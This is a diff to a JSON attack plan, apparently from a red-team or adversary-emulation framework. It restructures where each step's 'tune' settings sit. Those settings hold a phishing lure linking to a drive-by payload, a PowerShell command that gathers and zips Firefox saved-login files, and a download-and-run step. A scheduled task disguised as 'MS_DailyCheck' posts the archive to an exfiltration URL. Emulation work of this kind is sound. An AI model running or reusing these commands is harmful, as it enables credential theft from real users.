@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -65,7 +70,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -76,7 +82,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -87,10 +94,10 @@
                 "phishing": "self.phish_1",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -102,10 +109,10 @@
                 "phishing": "self.phish_1",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "body": "Save 20% on your next order!\nhttp://${self.driveby_domain}/${self.payload_name}SuperShoppers"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "body": "Save 20% on your next order!\nhttp://${self.driveby_domain}/${self.payload_name}SuperShoppers"
             }
         },
         {
@@ -115,10 +122,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\users\\$username\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles -Recurse | Where {$_.Name -match 'key3.db' -or $_.Name -match 'logins.json' -or $_.Name -match 'key4.db'} | ForEach-Object {Compress-Archive -Path $_.Fullname -DestinationPath C:\\Users\\$username\\AppData\\Local\\Temp\\new.zip -Update}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\users\\$username\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles -Recurse | Where {$_.Name -match 'key3.db' -or $_.Name -match 'logins.json' -or $_.Name -match 'key4.db'} | ForEach-Object {Compress-Archive -Path $_.Fullname -DestinationPath C:\\Users\\$username\\AppData\\Local\\Temp\\new.zip -Update}; echo \" \"}"
             }
         },
         {
@@ -128,10 +135,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell mkdir${self.temp_dir}; Invoke-WebRequest -Uri \"${self.driveby_domain}/help_win_x86.exe\" -OutFile${self.temp_dir}\\${self.tool_name}.exe"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell mkdir${self.temp_dir}; Invoke-WebRequest -Uri \"${self.driveby_domain}/help_win_x86.exe\" -OutFile${self.temp_dir}\\${self.tool_name}.exe"
             }
         },
         {
@@ -141,10 +148,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "self.temp_dir${\\}self.tool_name${.exe}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "self.temp_dir${\\}self.tool_name${.exe}"
             }
         },
         {
@@ -154,10 +161,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$time = [DateTime]::Now.AddMinutes(30); $hourMinute=$time.ToString(\"HH:mm\"); $command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; SchTasks.exe /Create /SC ONCE /TN \"MS_DailyCheck\", /TR \"powershell Invoke-RestMethod -Uri${self.exfil_url}-Method Post -InFile  C:\\Users\\$username\\AppData\\Local\\Temp\\new.zip\" /ST $hourMinute /F}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$time = [DateTime]::Now.AddMinutes(30); $hourMinute=$time.ToString(\"HH:mm\"); $command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; SchTasks.exe /Create /SC ONCE /TN \"MS_DailyCheck\", /TR \"powershell Invoke-RestMethod -Uri${self.exfil_url}-Method Post -InFile  C:\\Users\\$username\\AppData\\Local\\Temp\\new.zip\" /ST $hourMinute /F}"
             }
         },
         {
@@ -168,7 +175,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
